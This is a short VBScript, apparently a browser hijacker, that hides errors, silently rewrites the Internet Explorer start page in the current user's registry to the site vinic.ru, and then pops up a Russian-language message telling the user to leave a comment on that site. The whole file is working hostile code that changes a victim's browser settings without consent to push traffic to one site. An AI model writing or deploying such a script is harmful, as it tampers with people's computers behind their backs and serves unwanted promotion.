On error resume next
main()

sub main()
On error resume next
Set WshShell = WScript.createobject("Wscript.Shell")
WshShell.Regwrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Internet Explorer\Main\Start Page","vinic.ru"
msgbox("Обязательно оставь комментарий к новости на vinic.ru")
end sub